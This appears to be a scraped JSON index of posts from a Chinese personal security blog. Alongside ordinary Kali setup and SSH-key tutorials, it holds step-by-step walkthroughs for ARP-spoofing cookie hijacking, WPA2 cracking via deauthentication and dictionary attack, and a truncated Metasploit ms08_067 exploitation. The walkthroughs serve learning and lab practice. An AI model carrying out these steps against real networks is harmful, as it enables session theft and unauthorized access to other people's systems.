192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.1</span></div></pre></td></tr></table></figure>\n<p>欺骗受害主机192.168.1.131，网关192.168.1.1的MAC地址是攻击机的MAC地址，那么在局域网内，受害主机发送给网关的数据包，都会发送给攻击机<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3adliqnj30ki0duwi5.jpg\" alt=\"\"></p>\n<h2 id=\"③-抓取本地数据包\"><a href=\"#③-抓取本地数据包\" class=\"headerlink\" title=\"③ 抓取本地数据包\"></a>③ 抓取本地数据包</h2><p>重新打开一个终端，输入：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">tcpdump -<span class=\"selector-tag\">i</span> wlan0 -w hello.cap</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi2xbwlwwj30kf0dq75p.jpg\" alt=\"\"><br>将抓取到的数据保存到hello.cap文件中</p>\n<h2 id=\"④-耐心等待。。。\"><a href=\"#④-耐心等待。。。\" class=\"headerlink\" title=\"④ 耐心等待。。。\"></a>④ 耐心等待。。。</h2><p>此时，需要等待受害主机登录摸个网站，或刷新已经登录过的页面<br>相当于受害在想网关发送携带了cookie的数据包，我们就是要劫持这个cookie<br>当刷新完毕后，就可以结束 arpspoof 和 tcpdump</p>\n<h2 id=\"⑤-使用ferret分析抓取的数据包\"><a href=\"#⑤-使用ferret分析抓取的数据包\" class=\"headerlink\" title=\"⑤ 使用ferret分析抓取的数据包\"></a>⑤ 使用ferret分析抓取的数据包</h2><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">ferret</span> <span class=\"selector-tag\">-r</span> <span class=\"selector-tag\">hello</span><span class=\"selector-class\">.cap</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg\" alt=\"\"><br>查看根目录，会发现自动生成了hamster.txt文件</p>\n<h2 id=\"⑥-hamster架设代理，登录会话\"><a href=\"#⑥-hamster架设代理，登录会话\" class=\"headerlink\" title=\"⑥ hamster架设代理，登录会话\"></a>⑥ hamster架设代理，登录会话</h2><p>在终端输入<br><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">hamster</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg\" alt=\"\"><br>设置浏览器代理<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqi2yqbc8mj30f40iadhm.jpg\" alt=\"\"><br>打开hamster<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1eqi2z18sdfj311x0dqtch.jpg\" alt=\"\"><br>点击192.168.1.131<br>左边就是获取的cookie信息，找到合适的，就可以看到受害者的登录信息<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3096wd6j30m807sdi2.jpg\" alt=\"\"></p>\n<p>OK，攻击完毕啦，本教程仅做学习用途<del>~</del>~~~~</p>\n<h1 id=\"III、参考文献\"><a href=\"#III、参考文献\" class=\"headerlink\" title=\"III、参考文献\"></a>III、参考文献</h1><p><a href=\"http://www.it165.net/safe/html/201501/1025.html\" target=\"_blank\" rel=\"external\">局域网安全 利用ARP欺骗劫持Cookie</a><br><a href=\"http://yuangeqingtian.blog.51cto.com/6994701/1302773\" target=\"_blank\" rel=\"external\">linux开启路由转发功能</a></p>\n"},{"title":"ARP欺骗原理","url":"http://huirong.github.io/2015/03/25/arp/","content":"<p>详细讲解ARP欺骗的原理，实验在下篇博客<br><a id=\"more\"></a></p>\n<h1 id=\"I、ARP\"><a href=\"#I、ARP\" class=\"headerlink\" title=\"I、ARP\"></a>I、ARP</h1><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>\n<h1 id=\"II、ARP欺骗\"><a href=\"#II、ARP欺骗\" class=\"headerlink\" title=\"II、ARP欺骗\"></a>II、ARP欺骗</h1><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。<br>局域网的网络流通不是根据IP地址进行，而是根据MAC地址进行传输。</p>\n<h1 id=\"III、ARP欺骗工作原理\"><a href=\"#III、ARP欺骗工作原理\" class=\"headerlink\" title=\"III、ARP欺骗工作原理\"></a>III、ARP欺骗工作原理</h1><p>假设一个网络环境中，网内有2台主机，分别为主机A、B，网关。主机详细信息如下描述：<br>网关的地址为：IP：192.168.1.1 MAC: 01-01-01-01-01-01<br>A的地址为：IP：192.168.1.2 MAC: 02-02-02-02-02-02<br>B的地址为：IP：192.168.1.3 MAC: 03-03-03-03-03-03<br>正常情况下A和网关之间进行通讯。</p>\n<ol>\n<li>B向A发送一个自己伪造的ARP应答，而这个应答中的数据为发送方IP地址是192.168.1.1（网关的IP地址），MAC地址是03-03-03-03-03-03（网关的MAC地址本来应该是01-01-01-01-01-01，这里被伪造了）</li>\n<li>当A接收到B伪造的ARP应答，就会更新本地的ARP缓存（A被欺骗了），这时B就伪装成网关了。</li>\n<li>B同样向网关发送一个ARP应答，应答包中发送方IP地址四192.168.10.2（A的IP地址），MAC地址是03-03-03-03-03-03（A的MAC地址本来应该是 02-02-02-02-02-02，这里被伪造了）。</li>\n<li>当网关收到B伪造的ARP应答，也会更新本地ARP缓存（网关也被欺骗了），这时B就伪装成了A。</li>\n<li>样主机A和网关都被主机B欺骗，A和网关之间通讯的数据都经过了B。主机B完全可以知道他们之间说的什么：）。<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqhy7qjsuzj30fb09r0t9.jpg\" alt=\"\"><br>就是，A向网关发送数据包，先会发给B，在由B转发给网关<br>网关向A发送数据包，也先会发给B，在由B转发给A<h1 id=\"IV、参考文献\"><a href=\"#IV、参考文献\" class=\"headerlink\" title=\"IV、参考文献\"></a>IV、参考文献</h1><a href=\"http://baike.baidu.com/subview/32698/16532303.htm\" target=\"_blank\" rel=\"external\">ARP（地址解析协议）</a><br><a href=\"http://baike.baidu.com/view/155386.htm\" target=\"_blank\" rel=\"external\">ARP欺骗</a></li>\n</ol>\n"},{"title":"Kali使用小技巧--屏幕截图","url":"http://huirong.github.io/2015/03/24/skillInKali/","content":"<p>写博客，当然少不了图片，kali屏幕截图快捷键<br><a id=\"more\"></a></p>\n<ul>\n<li>全屏：PrintScreen</li>\n<li>区域截图：shift + PrintScreen</li>\n</ul>\n<p>如有其它小技巧，后续更新。。。。。。。。。</p>\n"},{"title":"在 Kali 中安装 chrome","url":"http://huirong.github.io/2015/03/24/installChrome/","content":"<p>在Win下习惯了chrome，安装kali之后就想换个浏览器<br>我使用如下命令安装chrome时，apt-get install google-chrome-stable，一直报错，找不到源，只好到官网上下载.deb安装包<br><a id=\"more\"></a></p>\n<h1 id=\"I、下载chrome安装包\"><a href=\"#I、下载chrome安装包\" class=\"headerlink\" title=\"I、下载chrome安装包\"></a>I、下载chrome安装包</h1><p>到官网上下载 <a href=\"https://www.google.com/intl/zh-CN/chrome/browser/desktop/index.html\" target=\"_blank\" rel=\"external\">chrome安装包</a><br>选择合适的安装包<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqh1mga2b3j30lo0gm0uj.jpg\" alt=\"\"></p>\n<h1 id=\"II、安装\"><a href=\"#II、安装\" class=\"headerlink\" title=\"II、安装\"></a>II、安装</h1><ul>\n<li><p>进入到.deb的目录，使用命令行安装</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dpkg -<span class=\"selector-tag\">i</span> google-chrome-stable_current_i386.deb</div></pre></td></tr></table></figure>\n<p>可以看到 应用程序 -&gt; 互联网 出现了久违的Google Chrome</p>\n</li>\n<li><p>修改相关配置<br>点击chrome图片之后，会提示“chrome不能作为跟用户运行”<br>不要紧，so easy，添加一条语句</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cd</span> /<span class=\"keyword\">opt</span>/google/chrome</div><div class=\"line\"><span class=\"keyword\">vim</span> google-chrome</div></pre></td></tr></table></figure>\n<p>在文件末尾的代码处添加<br>  –user-data-dir<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqh1q3bqmzj30kf029aaa.jpg\" alt=\"\"><br>ok了，可以正常使用了</p>\n<h1 id=\"III、参考文献\"><a href=\"#III、参考文献\" class=\"headerlink\" title=\"III、参考文献\"></a>III、参考文献</h1><p><a href=\"http://blog.csdn.net/change518/article/details/18556625\" target=\"_blank\" rel=\"external\">Kali linux 安装chrome</a></p>\n</li>\n</ul>\n<h1 id=\"IV、友情链接\"><a href=\"#IV、友情链接\" class=\"headerlink\" title=\"IV、友情链接\"></a>IV、友情链接</h1><p>使用chrome，不翻墙还不如不用，我用的是shadowsocks，参考如下网址<a href=\"http://jackroyal.github.io/2015/03/09/use-ss/\" target=\"_blank\" rel=\"external\">shadowsocks的安装和配置–在ubuntu和ubuntu中</a></p>\n"},{"title":"使用kali破解无线网","url":"http://huirong.github.io/2015/03/11/wireless/","content":"<p>之前也用kali破解无线网，但kali装在虚拟机上，虚拟机不支持无线网卡，即使使用小米随身wifi做适配器还是各种问题，前两天刚在硬盘上安装kali，就迫不及待的想试试了<br><a id=\"more\"></a><br>我使用的是 aircrack-ng 来破解，无线网加密方式是WPA2，现在一般的无线网都是这种加密方式</p>\n<h1 id=\"I、关于Aircrack-ng\"><a href=\"#I、关于Aircrack-ng\" class=\"headerlink\" title=\"I、关于Aircrack-ng\"></a>I、关于Aircrack-ng</h1><p>Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探。WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a,802.11b,802.11g的数据。<br>Aircrack-ng是一个包含了多款工具的无线攻击审计套装，这里面很多工具在后面的内容中都会用到，具体见下表：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1eq1wj6klytj30ff0cw76v.jpg\" alt=\"\"></p>\n<h1 id=\"II、使用Aircrack-ng破解WPA2加密的无线网\"><a href=\"#II、使用Aircrack-ng破解WPA2加密的无线网\" class=\"headerlink\" title=\"II、使用Aircrack-ng破解WPA2加密的无线网\"></a>II、使用Aircrack-ng破解WPA2加密的无线网</h1><h2 id=\"①-查看无线网卡\"><a href=\"#①-查看无线网卡\" class=\"headerlink\" title=\"① 查看无线网卡\"></a>① 查看无线网卡</h2><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">ifconfig</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1eq1wis1p6yj30k40dljuy.jpg\" alt=\"\"><br>wlan0即为我的无线网卡</p>\n<h2 id=\"②-使无线网卡处于监听模式\"><a href=\"#②-使无线网卡处于监听模式\" class=\"headerlink\" title=\"② 使无线网卡处于监听模式\"></a>② 使无线网卡处于监听模式</h2><p>用于嗅探的无线网卡要处于monitor监听模式（若不会，自行百度）<br><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">airmon-ng <span class=\"literal\">start</span> wlan0</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1eq1zm1ixgsj30ki0dtq5c.jpg\" alt=\"\"><br>当看到驱动下面显示有monitor mode enabled on mon0，即已启动监听模式，监听模式下适配器名称变更为mon0</p>\n<h2 id=\"③-探测无线网络，抓取无线数据包\"><a href=\"#③-探测无线网络，抓取无线数据包\" class=\"headerlink\" title=\"③ 探测无线网络，抓取无线数据包\"></a>③ 探测无线网络，抓取无线数据包</h2><p>激活无线网卡后就可以进行抓包了，是用airodump-ng工具实现，我这里分为两步来实现</p>\n<h3 id=\"1-查看bssid-channel\"><a href=\"#1-查看bssid-channel\" class=\"headerlink\" title=\"(1)查看bssid channel\"></a>(1)查看bssid channel</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">airodump-ng mon0</div></pre></td></tr></table></figure>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1eq1wkkjzb3j30p10i8jxw.jpg\" alt=\"\"><br>第一个就是我要破解的无线网，记住他的bssid channel号</p>\n<h3 id=\"2-抓包并保存\"><a href=\"#2-抓包并保存\" class=\"headerlink\" title=\"(2)抓包并保存\"></a>(2)抓包并保存</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">airodump-ng</span> <span class=\"selector-tag\">--ivs</span> <span class=\"selector-tag\">--ignore-negative-one</span> <span class=\"selector-tag\">--bssid</span>  <span class=\"selector-tag\">A8</span><span class=\"selector-pseudo\">:57</span><span class=\"selector-pseudo\">:4E</span><span class=\"selector-pseudo\">:77</span><span class=\"selector-pseudo\">:D0</span><span class=\"selector-pseudo\">:8C</span> <span class=\"selector-tag\">mon0</span></div></pre></td></tr></table></figure>\n<p>参数解释：</p>\n<ul>\n<li>–ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小</li>\n<li>–ignore-negative-one 没有使用这个参数的时候，一直fixed channel -1，导致后面的步骤一直出错，可能因为我的Aircrack-ng不是最新的版本，这个根据大家的实际情况来，不一定非得加上</li>\n<li>–bssid 待破解的无线网的MAC地址</li>\n<li>-c 无线网的工作频道</li>\n<li>-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，我的文件名为loanga。<font color=\"red\">大家一定要注意的是：</font>这里我们虽然设置保存的文件名是loanga，但是生成的文件却不是loanga.ivs，而是loanga-01.ivs。<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1eq1zssu6rtj311y0lcdj0.jpg\" alt=\"\"><h2 id=\"④-进行DeAuth攻击\"><a href=\"#④-进行DeAuth攻击\" class=\"headerlink\" title=\"④ 进行DeAuth攻击\"></a>④ 进行DeAuth攻击</h2>为了获得破解所需的WPA2握手验证的整个完整数据包，将会发送一种称之为“DeAuth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，大家也就有机会捕获到包含WPA2握手验证的完整数据包了<br>重新打开一个终端<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">aireplay-ng</span> <span class=\"selector-tag\">-0</span> 30 <span class=\"selector-tag\">-a</span> <span class=\"selector-tag\">A8</span><span class=\"selector-pseudo\">:57</span><span class=\"selector-pseudo\">:4E</span><span class=\"selector-pseudo\">:77</span><span class=\"selector-pseudo\">:D0</span><span class=\"selector-pseudo\">:8C</span> <span class=\"selector-tag\">mon0</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>参数解释：</p>\n<ul>\n<li>-0 采用DeAuth攻击模式，后面跟攻击次数</li>\n<li>-a 待破解的MAC地址<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eq1wmh2w48j30kf0don2o.jpg\" alt=\"\"><br>当抓包的界面出现 WPA handshake 时，即成功获取到无线WPA-PSK验证数据报文，就可以进行暴力破解了<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1eq1wm1m8j0j30jp0d7tb6.jpg\" alt=\"\"><h2 id=\"⑤-开始暴力破解\"><a href=\"#⑤-开始暴力破解\" class=\"headerlink\" title=\"⑤ 开始暴力破解\"></a>⑤ 开始暴力破解</h2><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">aircrack-ng -w <span class=\"regexp\">/usr/</span>share<span class=\"regexp\">/wordlists/</span>dictionary<span class=\"regexp\">/wordlist1.txt loanga-01.ivs</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>参数解释：<br>-w 后跟预先下载的字典，我的字典是在网上下载的，大家也可以自己下载生成字典的软件，自己制作字典<br>如果破解不成功，大家可以换一个字典<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1eqh3oj2cdcj30kc0domzg.jpg\" alt=\"\"><br>恭喜你，破解成功！！！！</p>\n<p>#参考文献</p>\n<ul>\n<li>完全教程 Aircrack-ng破解WEP、WPA-PSK加密利器<a href=\"http://netsecurity.51cto.com/art/201105/264844_all.htm\" target=\"_blank\" rel=\"external\">http://netsecurity.51cto.com/art/201105/264844_all.htm</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=zAh0yQdLXDc\" target=\"_blank\" rel=\"external\">https://www.youtube.com/watch?v=zAh0yQdLXDc</a></li>\n</ul>\n<font color=\"red\">本教程纯属学习。。。。。。</font>\n\n\n\n\n"},{"title":"win8下硬盘安装Kali双系统","url":"http://huirong.github.io/2015/03/09/installKail/","content":"<p>只有一个常用U盘，不想用来装系统，只好使用硬盘安装，听说比较麻烦，确实比较麻烦，出了好多问题<br><a id=\"more\"></a></p>\n<h1 id=\"I、准备工作\"><a href=\"#I、准备工作\" class=\"headerlink\" title=\"I、准备工作\"></a>I、准备工作</h1><h2 id=\"①-下载-kali镜像\"><a href=\"#①-下载-kali镜像\" class=\"headerlink\" title=\"① 下载 kali镜像\"></a>① 下载 <a href=\"https://www.kali.org/downloads/\" target=\"_blank\" rel=\"external\">kali镜像</a></h2><p>我下载的是64位版本的  <a href=\"http://cdimage.kali.org/kali-1.1.0/kali-linux-1.1.0-amd64.iso\" target=\"_blank\" rel=\"external\">http://cdimage.kali.org/kali-1.1.0/kali-linux-1.1.0-amd64.iso</a>，各位根据自己的实际情况下载</p>\n<h2 id=\"②-解压-kali-linux-1-0-9a-amd64iso\"><a href=\"#②-解压-kali-linux-1-0-9a-amd64iso\" class=\"headerlink\" title=\"② 解压 kali-linux-1.0.9a-amd64iso\"></a>② 解压 kali-linux-1.0.9a-amd64iso</h2><p>解压 kali-linux-1.0.9a-amd64iso 到某个盘根目录。（只需解压后的文件，不再需要iso）</p>\n<p><font color=\"red\">Tips：</font>解压后，里面的文件全部要放到根目录下，而不是在一个文件夹里面</p>\n<h2 id=\"③-分区\"><a href=\"#③-分区\" class=\"headerlink\" title=\"③ 分区\"></a>③ 分区</h2><p>windows下压缩一部分未使用的磁盘空间，到后面给kali linux使用<br>我用分区助手进行分区，一般20G左右就可以了，可根据实际情况选择大小，如下图<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eq0gae0r45j30hq080wfl.jpg\" alt=\"\"></p>\n<h2 id=\"④-添加引导项\"><a href=\"#④-添加引导项\" class=\"headerlink\" title=\"④ 添加引导项\"></a>④ 添加引导项</h2><p>安装EasyBCD,添加引导项<br>打开 -&gt; 条目 -&gt; NeoGrub -&gt; 安装 -&gt; 配置<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1eq0gcir4w3j30g70dljum.jpg\" alt=\"\"><br>在弹出的配置窗口粘贴下面代码<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">title Install kali　　</div><div class=\"line\">root (hd0,X)! ]<span class=\"number\">9</span> A- B0 K, ~<span class=\"number\">8</span> ~: s- a</div><div class=\"line\">kernel (hd0,X)/live/vmlinuz <span class=\"attr\">boot=live</span> <span class=\"attr\">noconfig=sudo</span> <span class=\"attr\">username=root</span> <span class=\"attr\">hostname=kali</span>　</div><div class=\"line\">initrd (hd0,X)/live/initrd.img</div><div class=\"line\">boot</div></pre></td></tr></table></figure></p>\n<p>其中“X”替换为你的iso解压目录，想了解（hd0,X）格式，可以百度一下，这里就不再多说了。</p>\n<h1 id=\"II、安装kali\"><a href=\"#II、安装kali\" class=\"headerlink\" title=\"II、安装kali\"></a>II、安装kali</h1><ol>\n<li>重启，进入live模式，点击左上角的appication -&gt; System tools -&gt; install kali,<br>开始安装kali<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eq0gdi4rzzj31kw16odxp.jpg\" alt=\"\"></li>\n<li>选择语言和地区<br>语言：Chinese（Simplified）<br>地区：中国 </li>\n<li>配置网络和域名<br>我的配置网络就是连接现有的有线网，然后分配IP什么的<br>domain留空不管他，下一步</li>\n<li>设置root密码<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eq0geixwv6j31kw16ono6.jpg\" alt=\"\"></li>\n<li>磁盘分区<br>这里我们手动进行分区，一共分三个区，一个300M的/boot分区，一个2048M的swap分区，其他的分为一个/（你也可以把/home单独分区出来），因为分区方法类似，所以我只讲一个/boot分区的步骤<br>首先选择最下面的手动分区<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eq0gfmfg0mj31kw16ob29.jpg\" alt=\"\"></li>\n</ol>\n<p><strong>创建boot分区</strong></p>\n<ul>\n<li>在选择之前分出来的空闲分区</li>\n<li>创建一个300M 的分区<br>创建好的分区如下：<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eq0giglz4uj31kw16ou0x.jpg\" alt=\"\"><br>需要双击修改相关参数，修改后的结果如下，然后选择“分区设定结束并将修改写入磁盘”<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eq0gk0vtgnj31kw16ox6p.jpg\" alt=\"\"></li>\n</ul>\n<p><strong>用同样的方法创建swap分区和其他分区</strong><br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1eq0glb9zghj31kw16oqv5.jpg\" alt=\"\"><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1eq0glpnt2lj31kw16ou0x.jpg\" alt=\"\"><br>区分结束后，结果如下：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1eq0gmllt1yj31kw16o1ky.jpg\" alt=\"\"></p>\n<ol>\n<li>坐等安装系统<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1eq0gnfi171j31kw16o1kx.jpg\" alt=\"\"><br>一段时间后，终于见到了熟悉的画面<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eq0go0rny6j31kw16odzj.jpg\" alt=\"\"></li>\n</ol>\n"},{"title":"one","url":"http://huirong.github.io/2015/03/05/one/","content":"<p>this is my first bolg!!!</p>\n"},{"title":"DigitalOcean初始化--使用SSH_Keys登录（Windows篇）","url":"http://huirong.github.io/2014/12/04/DigitalOcean初始化--使用SSH_Keys登录（Windows篇）/","content":"<h1 id=\"I、SSH密钥\"><a href=\"#I、SSH密钥\" class=\"headerlink\" title=\"I、SSH密钥\"></a>I、SSH密钥</h1><p>虽然可以使用基于密码的登录管理服务器，使用SSH密钥对会更好。 SSH密钥比密码更安全，并可以帮助您登录，而无需记住长密码。</p>\n<p>用PuTTYgen来生成SSH密钥，PuTTY创建SSH会话，连接服务器。SSH密钥对分为公钥和密钥，公钥可以对外公布，密钥自己保管，用来连接服务器。</p>\n<p>PuTTY、PuTTYgen <a href=\"http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html\" target=\"_blank\" rel=\"external\">下载地址</a></p>\n<h1 id=\"II、创建SSH密钥对\"><a href=\"#II、创建SSH密钥对\" class=\"headerlink\" title=\"II、创建SSH密钥对\"></a>II、创建SSH密钥对</h1><p>打开PuTTYgen，界面如下,点击 Generate 按钮<br><img src=\"https://img.blog.csdn.net/20141204210557253\" alt=\"\"></p>\n<p>由于SSH密钥使用的是信息安全的随机块创建，需要点击对话框的空白区域随机生成数据，要一直点击，直到完成<br><img src=\"https://img.blog.csdn.net/20141204210627283\" alt=\"\"></p>\n<p>生成之后的界面如下<br><img src=\"https://img.blog.csdn.net/20141204210820820\" alt=\"\"></p>\n<p>最好对密钥加密，在Key passphrase 输入框输入密钥密码，然后保存密钥和公钥 点击Save public key 和 Save private key，保存后的文件是.ppk格式</p>\n<h1 id=\"III、上传公钥到DigitalOcean\"><a href=\"#III、上传公钥到DigitalOcean\" class=\"headerlink\" title=\"III、上传公钥到DigitalOcean\"></a>III、上传公钥到DigitalOcean</h1><p>打开DigitalOcean Control界面，点击SSH Keys -&gt; Add SSH Key<br><img src=\"https://img.blog.csdn.net/20141204212033771\" alt=\"\"></p>\n<p>然后随便写一个公钥的名字，把刚才的公钥填写到下面，点击CREATE SSH KEY<br><img src=\"https://img.blog.csdn.net/20141204212313703\" alt=\"\"></p>\n<h1 id=\"IV、用刚才的公钥新建一个VPS服务器\"><a href=\"#IV、用刚才的公钥新建一个VPS服务器\" class=\"headerlink\" title=\"IV、用刚才的公钥新建一个VPS服务器\"></a>IV、用刚才的公钥新建一个VPS服务器</h1><p><img src=\"https://img.blog.csdn.net/20141204212624890\" alt=\"\"></p>\n<p>根据自己的情况填写，只是最后一次选择刚才新建的SSH Key<br><img src=\"https://img.blog.csdn.net/20141204212738700\" alt=\"\"></p>\n<h1 id=\"V、使用PuTTY创建SSH会话，连接服务器\"><a href=\"#V、使用PuTTY创建SSH会话，连接服务器\" class=\"headerlink\" title=\"V、使用PuTTY创建SSH会话，连接服务器\"></a>V、使用PuTTY创建SSH会话，连接服务器</h1><p>打开PuTTY，选择windows，输入刚开新建的虚拟机的IP，在DO（DigitalOcean）的控制面板中可以看到，使用默认端口号22<br><img src=\"https://img.blog.csdn.net/20141204213236848\" alt=\"\"></p>\n<p>然后选择Data ，输入服务器的用户名，习惯root，是系统管理员<br><img src=\"https://img.blog.csdn.net/20141204213529656\" alt=\"\">       <img src=\"https://img.blog.csdn.net/20141204213619906\" alt=\"\"></p>\n<p>SSH –&gt; Auth   点击Browser（预览） 选择之前保存的 .ppk 密钥文件（第二步，Save privacy key保存的文件）<br><img src=\"https://img.blog.csdn.net/20141204213157375\" alt=\"\"></p>\n<p>最后创建session，点击Session。为Session取一个方便记忆的名字，然后保存（点击Save），然后可以关掉PuTTY了，以后可以用这个Session连接服务器<br><img src=\"https://img.blog.csdn.net/20141204214035753\" alt=\"\"></p>\n<h1 id=\"Ⅵ、用PuTTY保存的Session连接服务器\"><a href=\"#Ⅵ、用PuTTY保存的Session连接服务器\" class=\"headerlink\" title=\"Ⅵ、用PuTTY保存的Session连接服务器\"></a>Ⅵ、用PuTTY保存的Session连接服务器</h1><p>再次打开PuTTY，点击Session –&gt; Load  双击刚才保存的Session 即DO_DROPLET_SESSION,然后点击下面的open，会出现一个警告框，选择yes</p>\n<p>恭喜你，连上服务器了，输入你的密钥密码就行了（第二步设置的key passphrase）<br><img src=\"https://img.blog.csdn.net/20141204215237738\" alt=\"\"></p>\n"},{"title":"metasploit 利用 ms08_067","url":"http://huirong.github.io/2014/10/29/metasploit利用ms08_067/","content":"<h1 id=\"I、实验环境\"><a href=\"#I、实验环境\" class=\"headerlink\" title=\"I、实验环境\"></a>I、实验环境</h1><ul>\n<li>目标主机  XP SP3 简体中文版</li>\n<li>IP  192.168.49.128</li>\n</ul>\n<h1 id=\"II、测试过程\"><a href=\"#II、测试过程\" class=\"headerlink\" title=\"II、测试过程\"></a>II、测试过程</h1><h2 id=\"①-选择exploit模块\"><a href=\"#①-选择exploit模块\" class=\"headerlink\" title=\"① 选择exploit模块\"></a>① 选择exploit模块</h2><figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">use</span> exploit/windows/smb/ms08_067_netapi</div></pre></td></tr></table></figure>\n<p>如果不知道ms08_067的具体位置  可以使用search ms08_067</p>\n<h2 id=\"②-选择payload\"><a href=\"#②-选择payload\" class=\"headerlink\" title=\"② 选择payload\"></a>② 选择payload</h2><figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> PAYLOAD <span class=\"comment\">windows</span>/shell/<span class=\"comment\">bind_tcp</span></div></pre></td></tr></table></figure>\n<p>查看需要设置的参数<br><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">show options</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://img.blog.csdn.net/20141029215838917\" alt=\"\"></p>\n<h2 id=\"③-设置目标主机\"><a href=\"#③-设置目标主机\" class=\"headerlink\" title=\"③ 设置目标主机\"></a>③ 设置目标主机</h2><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">set</span> <span 